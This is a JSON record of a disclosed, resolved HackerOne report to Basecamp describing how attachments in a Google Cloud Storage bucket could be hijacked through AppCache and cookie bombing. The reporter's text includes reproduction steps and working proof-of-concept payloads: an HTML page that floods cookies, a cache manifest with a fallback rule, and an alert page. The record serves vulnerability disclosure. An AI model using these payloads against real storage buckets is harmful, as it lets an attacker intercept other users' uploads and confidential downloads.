@@ -1,0 +1,427 @@
+{
+    "id": 403602,
+    "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC80MDM2MDI=",
+    "url": "https://hackerone.com/reports/403602",
+    "title": "Attachments may be hijacked via AppCache+CookieBombing trick (bc3_production_blobs bucket)",
+    "state": "Closed",
+    "substate": "resolved",
+    "severity_rating": "high",
+    "readable_substate": "Resolved",
+    "created_at": "2018-08-31T18:58:43.094Z",
+    "submitted_at": "2018-08-31T18:58:43.094Z",
+    "is_member_of_team?": false,
+    "is_organization_group_member?": false,
+    "reporter": {
+        "disabled": false,
+        "username": "hudmi",
+        "url": "/hudmi",
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/variants/000/056/794/ee8e97b1dd494059d1560fabeb1b43a842fca78c_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98"
+        },
+        "is_me?": false,
+        "cleared": false,
+        "verified": false,
+        "hackerone_triager": false,
+        "hacker_mediation": false
+    },
+    "team": {
+        "id": 67,
+        "url": "https://hackerone.com/basecamp",
+        "handle": "basecamp",
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/variants/STtZ2opgRsHdKby72xs56KhB/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+            "medium": "https://profile-photos.hackerone-user-content.com/variants/STtZ2opgRsHdKby72xs56KhB/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "permissions": [],
+        "submission_state": "open",
+        "default_currency": "usd",
+        "awards_miles": false,
+        "offers_bounties": true,
+        "state": "public_mode",
+        "only_cleared_hackers": false,
+        "pentest_feature_enabled?": false,
+        "profile": {
+            "name": "Basecamp",
+            "twitter_handle": "basecamp",
+            "website": "https://basecamp.com/about/policies/security/response",
+            "about": "Basecamp is the leading online project manager and the birthplace of Ruby on Rails. Creators of the HEY email service."
+        }
+    },
+    "has_bounty?": true,
+    "in_validation?": false,
+    "can_view_team": true,
+    "can_view_report": true,
+    "is_external_bug": false,
+    "is_published": false,
+    "is_participant": false,
+    "has_collaborators": false,
+    "submitted_by_team_member": false,
+    "stage": 4,
+    "public": true,
+    "visibility": "full",
+    "cve_ids": [],
+    "singular_disclosure_disabled": false,
+    "disclosed_at": "2020-11-26T18:20:26.237Z",
+    "bug_reporter_agreed_on_going_public_at": null,
+    "team_member_agreed_on_going_public_at": "2020-10-27T18:20:21.785Z",
+    "comments_closed?": false,
+    "facebook_team?": false,
+    "team_private?": false,
+    "vulnerability_information": "Basecamp attachments are stored in the `bc3_production_blobs` bucket in the root directory and can be served with `text/html` content-type. \n\nhttps://storage.googleapis.com/bc3_production_blobs/*key*?GoogleAccessId=bc3-production-storage%40bc3-production.iam.gserviceaccount.com&Expires=1535826443&Signature=*sign*&response-content-type=text/html\n\nSo with AppCache+CookieBombing trick an attacker can upload html file and if the user visit url of this file then all further uploads to this bucket and downloads from it will be hijacked by an attacker. \nTo know more about this trick refer to https://labs.detectify.com/2018/08/02/bypassing-exploiting-bucket-upload-policies-signed-urls/\n\n##Reproduction steps\nTo upload the files:\n1. Login to 3.basecamp.com\n2. Open campfire of any project\n3. Upload target files \n4. Extract direct links of them to Google Storage and remove `response-content-disposition` param\n\nI have uploaded 3 files by this way:\n```\n<html manifest=\"[manifest_url]\">\nThis is the test page for a PoC. Now if you send any request in this bucket it will be hijacked.\n<script>\nsetTimeout(function(){\nfor(var i = 1e3; i>0; i--){document.cookie = i + '=' + Array(4e3).join('0') + '; path=/'};\n}, 3000);\n</script>\n</html>\n```\n```\nCACHE MANIFEST \n\nFALLBACK:\n/bc3_production_blobs/ [fallback_url]\n```\n```\n<html>\n<script>\nalert('Your request to the page '+location.href+' is hijacked!');\n</script>\n</html>\n```\n\n##PoC\nGo to http://████████/bc3attach and then try to open any direct link of `bc3_production_blobs` bucket. You will see alert popup with full url of this file.\nRefer to the video.\n\n## Impact\n\nDirect links to any attachments can be hijacked and confedential files can be compromised",
+    "weakness": {
+        "id": 65,
+        "name": "Business Logic Errors"
+    },
+    "original_report_id": null,
+    "original_report_url": null,
+    "attachments": [
+        {
+            "id": 340718,
+            "file_name": "capture-132.avi",
+            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/340/718/989c84f09b7b41f34c3abf7706899a8deee834d3/capture-132.avi?response-content-disposition=attachment%3B%20filename%3D%22capture-132.avi%22%3B%20filename%2A%3DUTF-8%27%27capture-132.avi&response-content-type=video%2Fx-msvideo&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQRZXXXBVF%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T071641Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIGIRenCSrfPcgTzSaO8QX26B9paJvvasIMLYRmcGzR1cAiBjFJbPsOh%2Bik2kOVW9ts7HvOwRMYnKfesm5Nr%2BufbNjSq6BQif%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAMaDDAxMzYxOTI3NDg0OSIMsePPIpSJgdLj%2FGf1Ko4FqUJrhAMTg0ZIyb%2B1aVR%2FG44A2mOWZ6x6vGGcep4SvdMaIalmDAmh2pt6So6Qy6pOK2n939v4zbyM6seXirKyRXHKw3iQWhNjJuaJXlE%2FHpe8gmE3e2QADfkOI3u9bV1ho7yEPZHObU5ZkaCwbi3Is6ImJkL6vs5%2F4gEiKto44SQ1kryLDSiuArhEXZm3namcAI5Cjv0xN6eu3QFAwj26WQudVPnFodb9J2UU%2BNY62kiYfZwCkdUYNCV3h3WO77dhZEOKF7EVU2zEwT6i3iwfTz%2FuYPJii%2Bj5JLVrGySxCqLuu7dmgYLq3whyU6X8PjOFtZBZEAQZqoJikhB8g%2BEOp1A6ftYalZsJZFufaQH3B63suBHFinWrFMw%2FCCWa9eHCl%2BvLuhqDl1SvtrU5%2FxQ2fOB3XGBONTD%2B7q0ErqKRM8dzbyvym3KfNnlCZgsbpNp8yTkuBi4eos5SilEGPcT9n6ouE5N9DXS43l4YybpYIky11BVuk2UWkfEK3dJQnhFHIhOYMavdPRSa7lmdi2kEnxCTOXdkGUH%2FKAGLNRsYfow9oEoy4YZGB0FoX8Eq%2B08e452Whmi1JpkJiIRgenUwOU%2B87HWCJrJf%2BS0MSQDs5iILTtYS5iFbalf2GVWwSWLgfVrXYuasVIFmEyHP8cTyFTVVPWf7FbGzfvp2BXB%2BogUB2swB7y6hxqQQu0KsPAmJA4sEdO85nj80PQJYTchcTvnWpMZN1bO5y6Oa4j8pxE08cwvACkQ9eBEhdppZSTKhqiv6TYPjMrRiojGlm2WUIOpmXmZDBKwNL6CzTXZdt%2B2d3t8MhZGBnzal2u85ZD2a4VfqP%2BIWfF4PUlDbjBFrFINI07I%2BobnCRgS0mEUuMJubtqcGOrIBqq44iCmenp9XE9yUHVBdv6l%2BN3SN3TDA8%2BUOBKb0BjOOfC5%2F8dCdNYNF5%2B1thGdyGBRX0juTvEz1KUixIrQ38a2zYJ9WpJoFs%2BFZvOxXJIyeou8u5PXPnplCwDvyxlLqF78G8s7SPGknl0RozlWjJuX%2B7qWoaqc41gdx%2FiYArbSOEB1N32UD3yAr4%2Fn4%2BUBFO41EsEWEoOZ6cTRB3vEOpPx39KopEbOmfSAZ0iPUbZ6J1g%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=166f14f2384fb25d81d8689dbce34a3cc1f1e5a3e6ce436fa8601409e3db1a24",
+            "file_size": 595882,
+            "type": "video/x-msvideo"
+        }
+    ],
+    "allow_singular_disclosure_at": "2020-11-26T18:20:21.890Z",
+    "allow_singular_disclosure_after": -86878579.32343148,
+    "singular_disclosure_allowed": true,
+    "vote_count": 50,
+    "voters": [
+        "xploiterr",
+        "mashoud1122",
+        "fqdn",
+        "bibekshah",
+        "bughunterninja",
+        "locs3c",
+        "hetroublemakr",
+        "harry_mg",
+        "taaminz",
+        "f_m",
+        "and 40 more..."
+    ],
+    "severity": {
+        "rating": "high",
+        "author_type": "Team"
+    },
+    "structured_scope": {
+        "databaseId": 4655,
+        "asset_type": "URL",
+        "asset_identifier": "3.basecamp.com",
+        "max_severity": "critical"
+    },
+    "abilities": {
+        "assignable_team_members": [],
+        "assignable_team_member_groups": []
+    },
+    "activities": [
+        {
+            "id": 3276613,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::ReportTitleUpdated",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2018-08-31T18:59:50.951Z",
+            "updated_at": "2018-08-31T18:59:50.951Z",
+            "additional_data": {
+                "old_title": "Attachments can be hijacked via AppCache+CookieBombing trick (bc3_production_blobs bucket)",
+                "new_title": "Attachments may be hijacked via AppCache+CookieBombing trick (bc3_production_blobs bucket)"
+            },
+            "actor": {
+                "username": "hudmi",
+                "cleared": false,
+                "verified": false,
+                "url": "/hudmi",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/056/794/ee8e97b1dd494059d1560fabeb1b43a842fca78c_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "basecamp"
+        },
+        {
+            "id": 3278897,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "Thanks for this report, @hudmi! We'll have a look on Monday and will let you know. ",
+            "automated_response": false,
+            "created_at": "2018-09-01T09:20:39.514Z",
+            "updated_at": "2018-09-01T09:20:39.514Z",
+            "actor": {
+                "username": "rosa",
+                "cleared": false,
+                "verified": false,
+                "url": "/rosa",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/154/237/a07aeeba083a8f178942d326a68f6427c699e0f1_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "basecamp"
+        },
+        {
+            "id": 3281687,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::BugTriaged",
+            "message": "Thank you again for reporting this, great find. We confirmed the issue, so I'm moving this to Triaged. We're working on possible fixes. I'll follow up with a bounty within a week, and will let you know when we have a mitigation ready. \n\nThanks!",
+            "automated_response": false,
+            "created_at": "2018-09-02T20:45:06.979Z",
+            "updated_at": "2018-09-02T20:45:06.979Z",
+            "actor": {
+                "username": "rosa",
+                "cleared": false,
+                "verified": false,
+                "url": "/rosa",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/154/237/a07aeeba083a8f178942d326a68f6427c699e0f1_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "basecamp"
+        },
+        {
+            "id": 3281693,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "ok",
+            "automated_response": false,
+            "created_at": "2018-09-02T20:48:29.403Z",
+            "updated_at": "2018-09-02T20:48:29.403Z",
+            "actor": {
+                "username": "hudmi",
+                "cleared": false,
+                "verified": false,
+                "url": "/hudmi",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/056/794/ee8e97b1dd494059d1560fabeb1b43a842fca78c_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "basecamp"
+        },
+        {
+            "id": 3303015,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::BountyAwarded",
+            "message": "Hey @hudmi!\nWe are still working on a fix for this (it's not straightforward, but we are close), we'll let you know when it's ready. This vulnerability falls in our $500+ tier (without getting into the $1000+ tier), and we decided to award the top of that tier. It's a very clever attack 😃\n\nThank you!",
+            "automated_response": false,
+            "created_at": "2018-09-06T19:48:55.076Z",
+            "updated_at": "2018-09-06T19:48:55.076Z",
+            "actor": {
+                "url": "/basecamp",
+                "ibb": false,
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/STtZ2opgRsHdKby72xs56KhB/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "profile": {
+                    "name": "Basecamp"
+                }
+            },
+            "bounty_currency": "usd",
+            "genius_execution_id": null,
+            "team_handle": "basecamp",
+            "collaborator": {
+                "username": "hudmi",
+                "url": "/hudmi"
+            }
+        },
+        {
+            "id": 3306933,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "Thanks!",
+            "automated_response": false,
+            "created_at": "2018-09-07T10:54:59.687Z",
+            "updated_at": "2018-09-07T10:54:59.687Z",
+            "actor": {
+                "username": "hudmi",
+                "cleared": false,
+                "verified": false,
+                "url": "/hudmi",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/056/794/ee8e97b1dd494059d1560fabeb1b43a842fca78c_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "basecamp"
+        },
+        {
+            "id": 3472546,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "Hi @hudmi!\n\nSorry for the wait while we worked on this, and thanks for your patience. In the end, this was significantly more laborious than we thought, mainly due to how Google Cloud Storage works and our implementation. Fortunately, we believe we have now mitigated this. Could you please verify whether you can still reproduce this kind of attack?\n\nThank you!",
+            "automated_response": false,
+            "created_at": "2018-10-12T19:42:25.188Z",
+            "updated_at": "2018-10-12T19:42:25.188Z",
+            "actor": {
+                "username": "rosa",
+                "cleared": false,
+                "verified": false,
+                "url": "/rosa",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/154/237/a07aeeba083a8f178942d326a68f6427c699e0f1_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "basecamp"
+        },
+        {
+            "id": 3476698,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "Confirmed",
+            "automated_response": false,
+            "created_at": "2018-10-13T22:45:41.597Z",
+            "updated_at": "2018-10-13T22:45:41.597Z",
+            "actor": {
+                "username": "hudmi",
+                "cleared": false,
+                "verified": false,
+                "url": "/hudmi",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/056/794/ee8e97b1dd494059d1560fabeb1b43a842fca78c_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "basecamp"
+        },
+        {
+            "id": 3477461,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::ReportSeverityUpdated",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2018-10-14T08:24:33.708Z",
+            "updated_at": "2018-10-14T08:24:33.708Z",
+            "additional_data": {
+                "old_severity": null,
+                "new_severity": "High",
+                "old_severity_id": null,
+                "new_severity_id": 224092
+            },
+            "actor": {
+                "username": "rosa",
+                "cleared": false,
+                "verified": false,
+                "url": "/rosa",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/154/237/a07aeeba083a8f178942d326a68f6427c699e0f1_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "basecamp"
+        },
+        {
+            "id": 3477462,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::BugResolved",
+            "message": "Thank you! ",
+            "automated_response": false,
+            "created_at": "2018-10-14T08:24:42.883Z",
+            "updated_at": "2018-10-14T08:24:42.883Z",
+            "actor": {
+                "username": "rosa",
+                "cleared": false,
+                "verified": false,
+                "url": "/rosa",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/154/237/a07aeeba083a8f178942d326a68f6427c699e0f1_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "reporter": {
+                "username": "hudmi",
+                "url": "/hudmi"
+            },
+            "genius_execution_id": null,
+            "team_handle": "basecamp"
+        },
+        {
+            "id": 9651371,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::AgreedOnGoingPublic",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2020-10-27T18:20:21.809Z",
+            "updated_at": "2020-10-27T18:20:21.809Z",
+            "first_to_agree": true,
+            "actor": {
+                "username": "georgeclaghorn",
+                "cleared": false,
+                "verified": false,
+                "url": "/georgeclaghorn",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/019/774/ca6398181b4bb7b5b1b34ac9c1fb592a799e9239_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "basecamp"
+        },
+        {
+            "id": 9937162,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::ReportBecamePublic",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2020-11-26T18:20:26.296Z",
+            "updated_at": "2020-11-26T18:20:26.296Z",
+            "actor": {
+                "url": "/basecamp",
+                "ibb": false,
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/STtZ2opgRsHdKby72xs56KhB/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "profile": {
+                    "name": "Basecamp"
+                }
+            },
+            "genius_execution_id": null,
+            "team_handle": "basecamp"
+        }
+    ],
+    "activity_page_count": 1,
+    "activity_page_number": 1,
+    "summaries": [
+        {
+            "category": "team",
+            "can_view?": true,
+            "can_create?": false
+        },
+        {
+            "category": "researcher",
+            "can_view?": true,
+            "can_create?": false
+        }
+    ]
+}
